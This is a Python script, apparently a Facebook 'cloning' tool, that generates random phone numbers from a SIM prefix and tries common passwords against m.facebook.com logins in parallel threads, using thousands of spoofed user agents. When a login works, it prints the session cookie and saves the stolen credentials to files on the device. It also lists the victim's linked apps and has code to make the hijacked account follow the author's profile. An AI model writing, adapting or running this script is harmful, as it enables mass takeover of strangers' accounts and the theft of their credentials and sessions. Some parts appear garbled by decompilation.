import os,sys,time,json,random,re,string,platform,base64,uuid
os.system("git pull")
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
import requests as ress
from datetime import date
from datetime import datetime
from time import sleep
from time import sleep as waktu
try:
    import requests
    from concurrent.futures import ThreadPoolExecutor as ThreadPool
    import mechanize
    from requests.exceptions import ConnectionError
except ModuleNotFoundError:
    os.system('pip install mechanize requests futures bs4==2 > /dev/null')
    os.system('pip install bs4')

def ud():
    os.system('clear')
    jalan(logo)
    print(' [1] FIRST FOLLOW ME')
    print(' [2] EXIT')
    opt = input('\n   Choose option >>> ')
    if opt == '1':
        os.system('xdg-open https://www.facebook.com/AbRaHaM.Er.AbBu.01')
        i()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')

def cek_apk(session,coki):
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Active  Apk%s  '%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m ☆ Your Active Apps ☆     :{WHITE}'%(GREEN))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
        #else:
            #print(f'\r %s[%s!%s] Sorry, Apk check failed invalid cookie'%(N,M,N))
    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
    sop = BeautifulSoup(w,"html.parser")
    x = sop.find("form",method="post")
    game = [i.text for i in x.find_all("h3")]
    if len(game)==0:
        print(f'\r%s[%s!%s] %sSorry there is no Expired Apk%s           \n'%(N,M,N,M,N))
    else:
        print(f'\r[🎮] %s \x1b[1;95m ◇ Your Expired Apps ◇    :{WHITE}'%(M))
        for i in range(len(game)):
            print(f"\r[%s%s] %s%s"%(N,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
        else:
            print('')

def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100015315258519', {
            'cookie': coki }, **('cookies',)).text, 'html.parser')
        get = r.find('a', 'Ikuti', **('string',)).get('href')
        session.get('https://mbasic.facebook.com' + str(get), {
            'cookie': coki }, **('cookies',)).text



class jalan:
    def __init__(self, z):
        for e in z + "\n":
            sys.stdout.write(e)
            sys.stdout.flush()
            time.sleep(0.009)

RED = '\033[1;91m'
WHITE = '\033[1;97m'
GREEN = '\033[1;32m' #
YELLOW = '\033[1;33m'
BLUE = '\033[1;34m'
ORANGE = '\033[1;35m'
P = '\x1b[1;97m' # PUTIH
M = '\x1b[1;91m' # MERAH
H = '\x1b[1;92m' # HIJAU
K = '\x1b[1;93m' # KUNING
B = '\x1b[1;94m' # BIRU
U = '\x1b[1;95m' # UNGU
O = '\x1b[1;96m' # BIRU MUDA
N = '\x1b[0m'    # WARNA MATI
A = '\x1b[1;90m' # WARNA ABU ABU
BN = '\x1b[1;107m' # BELAKANG PUTIH
BBL = '\x1b[1;106m' # BELAKANG BIRU LANGIT
BP = '\x1b[1;105m' # BELAKANG PINK
BB = '\x1b[1;104m' # BELAKANG BIRU
BK = '\x1b[1;103m' # BELAKANG KUNING
BH = '\x1b[1;102m' # BELAKANG HIJAU
BM = '\x1b[1;101m' # BELAJANG MERAH
BA = '\x1b[1;100m' # BELAKANG ABU ABU
my_color = [
 P, M, H, K, B, U, O, N]
warna = random.choice(my_color)
now = datetime.now()
dt_string = now.strftime("%H:%M")
current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
today = date.today()
logo =                                          ("""
\x1b[1;92m  ╔═╦═╗╔═╗  ╔══╗╔╦╗╔═╗╔╦╗╔═╗╔═╗
\x1b[1;93m  ║║║║║║╬║  ║═╦╝║║║║╔╝║╔╝║╦╝║╬║
\x1b[1;94m  ║║║║║║╗╣  ║╔╝─║║║║╚╗║╚╗║╩╗║╗╣
\x1b[1;95m  ╚╩═╩╝╚╩╝  ╚╝──╚═╝╚═╝╚╩╝╚═╝╚╩╝
────────  ───────────────────

\033[1;37m======================================
\033[1;34mFACEBOK      : \033[1;34m MD Sabbir Hossain Rafi♻️✅ 
\033[1;35mGITHUB       :  \033[1;35mDARK🖐️🔰
\033[1;36mSTATUS       :  \033[1;36mTOOL IS FREE
\033[1;32mTOOL VIRSION :  \033[1;32m1.1.1
\033[1;36mWAIT AND SEE BRO FEEL KORO JUST
\033[1;37m======================================
       \33[37;41m\t WELLCOME TO FUCKER TOOL\33[0;m
\033[1;37m========================================\n""")
loop = 0
oks = []
cps = []

def clear():
    os.system('clear')
    print(logo)
from time import localtime as lt
from os import system as cmd
ltx = int(lt()[3])
if ltx > 12:
    a = ltx-12
    tag = "PM"
else:
    a = ltx
    tag = "AM"


try:
    print('\n\n\033[1;33mLoading asset files ... \033[0;97m')
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
#global functions
def dynamic(text):
    titik = ['.   ','..  ','... ','.... ']
    for o in titik:
        print('\r'+text+o),
        sys.stdout.flush();time.sleep(1)

#User agents

ugen2=[]
ugen=[]

for xd in range(5000):
        aa='Mozilla/5.0 (Linux; U; Android'
        b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(uaku2)

        aa='Mozilla/5.0 (X11; U; U; Linux x86_64; en-us'
        b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=(f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}')
        ugen.append(uaku2)

for xd in range(10000):
        a='Mozilla/5.0 (Symbian/3; Series60/'
        b=random.randrange(1, 9)
        c=random.randrange(1, 9)
        d='Nokia'
        e=random.randrange(100, 9999)
        h=random.randrange(1, 4)
        i=random.randrange(1, 4)
        j=random.randrange(1, 4)
        k='Mobile Safari/535.1'
        uaku=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
        ugen.append(uaku)


        aa='Mozilla/5.0 (Linux; Android'
        b=random.choice(['3','4','5','6','7','8','9','10','11','12','13','14','15','16','17'])
        c=' en-us; GT-'
        d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        e=random.randrange(1, 999)
        f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
        g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
        h=random.randrange(73,100)
        i='0'
        j=random.randrange(4200,4900)
        k=random.randrange(40,150)
        l='Mobile Safari/537.36'
        uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
        ugen.append(uaku2)

# APK CHECK
def i():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    print(logo)


    print(" \x1b[1;92m\t  USE OUR COUNTRY CODE  ")
    print(' \x1b[1;94m     \t     PAKISTAN CODE\n     \033[1;33m92301, \033[1;33m92302 ,\033[1;33m92303 ,\033[1;33m92305  ...\033[0;97m')
    print('\033[1;32m============================================')
    print(' \x1b[1;95m     \t     INDIA CODE\n     \033[1;33m91778, \033[1;33m91930 ,\033[1;33m91902 ,\033[1;33m91712  ...\033[0;97m')
    print('\033[1;32m============================================')
    print(' \x1b[1;96m     \t     BANGLADESH CODE\n     \033[1;33m0161, \033[1;33m0171 ,\033[1;33m0181 ,\033[1;33m0191  ...\033[0;97m')
    print('\033[1;32m============================================\n')
    kode = input(' [💉] Enter sim code: ')
    kodex = ''.join(random.choice(string.digits) for _ in range(2))
    kod = ''.join(random.choice(string.digits) for _ in range(2))
    doamin = ' Facebook CLONING (BD number) '
    limit = int(input('[?] How many numbers do you want to add : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(4))
        user.append(nmp)
    with ThreadPool(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(user))
        print(' [♥]  Total ids:\033[1;92m '+tl)
        print(f"\033[1;97m [♥]  Target Doamin:\033[1;92m {doamin}")
        print(' \033[1;97m[♥]  The process has been started')
        print(' [♥]  Wait for ids ')
        print(50*'_')
        for guru in user:
            uid = kode+kodex+kod+guru
            pwx = [kode+kodex+kod+guru,kod+guru,kodex+guru,kode+kodex+kod,'Bangladesh','bangladesh','i love you','iloveyou','free fire','I Love You']
            yaari.submit(rcrack,uid,pwx,tl)
    print(50*'_')
    print(' [♥] Crack process has been completed')
    print(' [♥] Ids saved in ok.txt,cp.txt')
    print(50*'_')

def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global proxy
    try:
        for ps in pwx:
            pro = random.choice(ugen)
#            pro2 = random.choice(ugen2)
            session = requests.Session()
            free_fb = session.get('https://m.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority': 'm.facebook.com',
            'upgrade-insecure-requests': '1',
                        'viewport-width': '980',
                        'method': 'GET',
                        'scheme': 'https',
    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
    'accept-language': 'en-US,en;q=0.9',
    'cache-control': 'max-age=0',
    'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    "user-agent": pro}
            lo = session.post('https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[7:22]
                print('\r\r\033[1;32m(FUCKER-OK✅)  ' +uid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/FUCKER-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('\r\r\33[1;30m[FUCKER-CP] ' +uid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/FUCKER-CP.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r\r%s[FUCKER] [%s/%s]  OK:- %s  CP:- %s '%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
ud()
